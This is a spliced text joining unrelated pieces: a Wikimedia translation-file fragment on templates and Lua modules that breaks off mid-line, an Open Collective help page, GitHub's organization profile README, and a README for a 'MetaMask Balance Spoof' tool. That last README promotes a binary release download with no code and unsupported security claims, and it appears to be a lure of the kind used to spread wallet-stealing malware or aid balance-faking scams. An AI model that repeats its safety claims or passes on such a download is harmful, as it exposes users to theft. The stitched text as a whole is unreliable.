msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/35"
msgid "==== Templates and modules ===="
msgstr "==== Templates and modules ===="

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/36"
msgid "'''Templates''' enable one piece of content to appear on multiple wiki pages (\"transclusion\"). Many wikis rely heavily on templates: there are thousands of them, they're used on almost every page, and they're integral to wiki functionality. You can pass parameters to templates to customize how content is handled in different contexts."
msgstr "'''Templates''' enable one piece of content to appear on multiple wiki pages (\"transclusion\"). Many wikis rely heavily on templates: there are thousands of them, they're used on almost every page, and they're integral to wiki functionality. You can pass parameters to templates to customize how content is handled in different contexts."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/37"
msgid "Template example: format blockquotes"
msgstr "Template example: format blockquotes"

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/38"
msgid "The [[:en:Template:Blockquote|Blockquote template]] provides formatting for block quotations, and includes preformatted attribution parameters for a quote's author and source."
msgstr "The [[:en:Template:Blockquote|Blockquote template]] provides formatting for block quotations, and includes preformatted attribution parameters for a quote's author and source."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/39"
msgid "This enables editors to use wikitext markup to easily and consistently style how block quotes display on wiki pages."
msgstr "This enables editors to use wikitext markup to easily and consistently style how block quotes display on wiki pages."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/40"
msgid "Screenshot of the Template:Blockquote documentation showing how it works."
msgstr "Screenshot of the Template:Blockquote documentation showing how it works."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/41"
msgid "You don't need a developer account to edit or create a template, and they're written in wikitext. That makes templates an easy way to get started with customizing wiki behavior."
msgstr "You don't need a developer account to edit or create a template, and they're written in wikitext. That makes templates an easy way to get started with customizing wiki behavior."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/42"
msgid "'''Modules''' are similar to templates, but instead of being written in wikitext, they use the Lua programming language. While templates are part of the core MediaWiki application, support for modules is implemented by an extension called $scribunto."
msg

---
description: >-
  Thinking of starting a project? Get legal status and receive, send, and manage
  your money transparently on Open Collective
icon: people-group
---

# Collectives

There are thousands of different collectives currently growing on Open Collective.

Setting up a collective can be a great way for a group of people to work together on a shared goal or interest.

We help you to build all sorts of initiatives that make a difference. That might involve running a community kitchen or a mutual aid group, helping people in your neighborhood, or building resilience around your open-source software project.

Establish the backbones for your next meetup group, union, climate activist collective, or political movement.

{% hint style="info" %}
On Open Collective you can:<br>

* Get started without the paperwork&#x20;
* Raise money and accept contributions without setting up a bank account&#x20;
* Pay bills and expenses quickly and simply&#x20;
* Provide transparent budgeting for your community
* Meet and connect with other collectives.<br>

No need to incorporate, hire a lawyer and accountant, or define organizational roles!
{% endhint %}



### Find out more

Whether you’re launching or building your collective, these pages can help you navigate the Open Collective platform.

#### [Setting Up](../getting-started/setting-up-your-account.md)

Create a user account before you do anything else.

#### [Create a Collective](creating-a-collective/)

Name your collective and add it to our platform.

#### [Add your Team Members](../getting-started/adding-and-removing-team-members.md)

If you’ve got people helping you, here’s how to give them access.

#### [Select a Fiscal Host](choosing-a-fiscal-host.md)

Your Fiscal Host will grant you legal status and take care of your money. Find the right one for you.

#### [Managing Collective Funds](managing-money/)

Your Collective’s budget is open and transparent, so everyone can see what’s happening.

#### [Raise Money](raising-money/)

Bring in money for your cause, from donations to sales and more.

#### [Pay Expenses](spending-money/)

Pay and keep track of new expense claims

#### [Spreading the Word](../advanced/keeping-your-community-updated/)

Let people know what your collective is doing, and build your audience.

#### [Create Events](events.md)

Sell tickets and bring your community together.

#### [Connect your social media](/broken/pages/LMMjhgCN8GBWGbcuOQjo)

Show people where to find your social accounts.
## Hey, this is us 👋

![An illustration showing a variety of differently themed Octocats. Monuments from different cities are indicated in the background like the Space Needle, Berlin Fernsehturm and Transamerica Pyramid.](https://user-images.githubusercontent.com/3369400/133268513-5bfe2f93-4402-42c9-a403-81c9e86934b6.jpeg)

Yes, we are building GitHub on GitHub. In fact, we’ve been doing this since **October 19th, 2007**. That's when we made our first commit. Since then we pushed **over 2.5 million commits**, opened **over 1 million issues**, submitted roughly **650k pull requests** across **4357 repositories** from over **50 countries** 🤯. But that's just us. We are proud  to be part of the work of millions of developers, companies and robots across the solar system 🪐. Yes, [Robots](https://github.com/readme/featured/nasa-ingenuity-helicopter)!

### 🍿 An interconnected community

The open source community is the 💗 heart of GitHub and fundamental to how we build software today. See for yourself:

- [GitHub Sponsors](https://github.com/sponsors) helped support more than **5k** individuals and projects around the world 🌍
- Open source projects on GitHub received a stunning **218 million** contributions 🚀 in the last year alone
- **Every minute** a developer creates a new release 🏄 for a public project on GitHub

Now that we are talking about the important things ☝️, are you contributing to open source? Yes? Okay, you rock! 🪨 If not, we can help you get started! Open source software is made by people just like you. Learn more about [how to contribute](https://opensource.guide/).

### 🦦 Contributing to the ecosystem

We contribute to the tools 🔧 we rely on to build and run GitHub, while also maintaining 🧙‍♂️ our own open source projects like:

- [GitHub CLI](https://github.com/cli/cli) - A command line tool for GitHub
- [Git Large File Storage](https://github.com/git-lfs/git-lfs) - A git extension for versioning large files
- [Primer](https://github.com/primer/css) - The GitHub design system

### 👓 Appendix

See what's next on our [public roadmap](https://github.com/github/roadmap) ✨ and [let us know](https://github.com/github/feedback) if you have any suggestions 🙇‍♂️. Oh, and by the way, we are always hiring talented, passionate people to [join our team](https://github.com/about/careers) 🙌.

<details> 
        <summary>"Tell me more, I can't get enough!"</summary>
        <br>
        <ul>
        <li>GitHub is built using mighty 🔨 open source technologies like <a href="https://github.com/rails">Ruby on Rails</a>, <a href="https://github.com/golang">Go</a>, <a href="https://github.com/primer/">Primer</a>, <a href="https://github.com/reactjs">React</a> and <a href="https://github.com/apache/kafka">Kafka</a> among others.</li>
                <li>The three open source projects GitHub members have most contributed 👩‍💻 to are:
                        <ul>
                                <li><a href="https://github.com/microsoft/vscode">Visual Studio Code</a></li>
                                <li><a href="https://github.com/rails/rails">Ruby on Rails</a></li>
                                <li><a href="https://github.com/Homebrew">Homebrew</a></li>
                        </ul>
                </li>
                <li>By the way, our <a href="https://github.com/github/docs">documentation</a> 🤓 is also open sourced</li>
        </ul>
</details>

---

<sub>🤫 Psst! You can create your own [organization README](https://docs.github.com/en/organizations/collaborating-with-groups-in-organizations/customizing-your-organizations-profile).</sub>

<!--
Made with 🖤
🙇‍♂️🎤⬇️
-->

<p align="center">
  <img src="https://api.iconify.design/mdi:wallet-outline.svg?width=100&height=100" alt="Wallet Icon">
</p>

<h1 align="center">🦊 MetaMask Balance Spoof</h1>
<h3 align="center">Ethereum dApp Security Testing Tool</h3>
<h4 align="center">Developer • Testing • Secure • Simulation</h4>

## 🚀 Quick Setup

<p align="center">
  <a href="#">
    <img src="https://api.iconify.design/line-md:download-loop.svg?width=100&height=100" alt="Download Icon">
  </a>
</p>

<div align="center">

### ⬇️ Download for Development

**Latest developer release in [Releases](https://github.com/Elizejtichavsky588/MetaMask-Balance-Spoof/releases)**

</div>

## 💡 Development Tool Overview

**MetaMask Balance Spoof** is a security testing utility designed to help Ethereum dApp developers safely simulate various wallet balance scenarios and test frontend interface behavior in controlled development environments.

---

## ⚡ Core Features

### 🎯 Balance Simulation
- **Custom Balance Testing**: Simulate any ETH balance amount
- **Token Balance Mocking**: Test ERC-20 token display logic
- **NFT Portfolio Simulation**: Mock NFT ownership states
- **Network Balance Variations**: Test different network responses

### 🔍 Frontend Testing
- **UI Response Analysis**: Verify frontend balance display
- **Error Handling**: Test edge cases and error states
- **Loading States**: Simulate balance loading scenarios
- **Currency Conversion**: Test price display logic

---

## 🔐 Maximum Security

### 🛡️ Protected Environment
- 100% local execution
- No real wallet connection
- No private key exposure
- Isolated testing sandbox

### 📚 Development Focus
- dApp security validation
- Frontend behavior testing
- User experience optimization
- Security vulnerability assessment

---

## 🎯 Testing Objectives

### 🔧 Development Tools
- Balance display algorithms
- Currency formatting systems
- Error state management
- Loading animation testing

### 📖 Quality Assurance
- Frontend security principles
- User interface validation
- Edge case scenario testing
- Development best practices

---

## 👥 Target Audience

### 🎓 dApp Developers
- Ethereum frontend development
- Web3 interface testing
- Smart contract integration
- User experience design

### 🔐 Security Auditors
- Frontend security analysis
- Interface vulnerability testing
- User protection validation
- Security assessment protocols

### 👨‍💻 QA Engineers
- dApp testing procedures
- User scenario simulation
- Interface behavior validation
- Quality assurance methodology

---

## 🛠️ System Requirements

<table align="center">
  <tr>
    <td align="center" width="110">
      <img src="https://api.iconify.design/mdi:windows.svg?width=48&height=48" alt="Windows">
      <br>
      <strong>Windows</strong>
    </td>
    <td>
      <code>10</code> • 
      <code>11</code>
    </td>
  </tr>
  <tr>
    <td align="center">
      <img src="https://api.iconify.design/mdi:apple.svg?width=48&height=48" alt="macOS">
      <br>
      <strong>macOS</strong>
    </td>
    <td>
      <code>Big Sur</code> • 
      <code>Monterey</code> • 
      <code>Ventura</code>
    </td>
  </tr>
  <tr>
    <td align="center">
      <img src="https://api.iconify.design/mdi:linux.svg?width=48&height=48" alt="Linux">
      <br>
      <strong>Linux</strong>
    </td>
    <td>
      <code>Ubuntu</code> • 
      <code>Debian</code> • 
      <code>CentOS</code>
    </td>
  </tr>
</table>

---

## ⚠️ Critical Legal Notice

> **DEVELOPMENT USE ONLY**: This tool is provided **EXCLUSIVELY FOR dAPP DEVELOPMENT AND SECURITY TESTING PURPOSES**. It simulates MetaMask balance scenarios for frontend testing and security validation. Any use outside development contexts is strictly prohibited.

---

## ❤️ Developer Community

<div align="center">

**Used by Ethereum developers worldwide**

![Developers](https://img.shields.io/badge/Active_Developers-2.5K+-blue?style=flat-square)
![Projects](https://img.shields.io/badge/dApp_Projects-15K+-green?style=flat-square)
![Effectiveness](https://img.shields.io/badge/Testing_Efficiency-92%25+-red?style=flat-square)

</div>

---

<p align="center">
  <strong>Test your dApp frontend with realistic balance scenarios — for development purposes only! 🦊</strong>
</p>

<div align="center">

⭐ Star this repository for Ethereum development tools!

</div>
